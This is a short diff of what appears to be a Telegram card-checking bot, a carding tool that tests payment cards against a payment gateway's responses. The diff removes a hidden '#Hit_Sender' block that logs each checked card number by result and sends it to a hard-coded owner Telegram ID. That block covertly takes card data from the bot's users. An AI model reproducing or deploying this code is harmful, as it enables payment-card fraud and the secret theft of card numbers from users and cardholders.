@@ -89,26 +89,6 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 
 𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
-
-#Hit_Sender
-				owner_id = 7805235233  #
-				
-				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
-
-				if "succeeded" in last:
-				    with open("thank_cards.txt", "a") as thank_file:
-				        thank_file.write(card_info + "\n")
-				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
-
-				elif "Not sufficient funds" in last:
-				    with open("insufficient_cards.txt", "a") as insufficient_file:
- 				       insufficient_file.write(card_info + "\n")
-				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n💳 Card: {cc.strip()}")
-
-				else:
-				    with open("other_cards.txt", "a") as other_file:
- 				       other_file.write(card_info + "\n")
-#Hit_Sender
 				
 				print(last)
 				if 'succeeded' in last:
@@ -159,6 +139,7 @@ def menu_callback(call):
 	with open("stop.stop", "w") as file:
 		pass
 bot.polling()
+
 
 
 
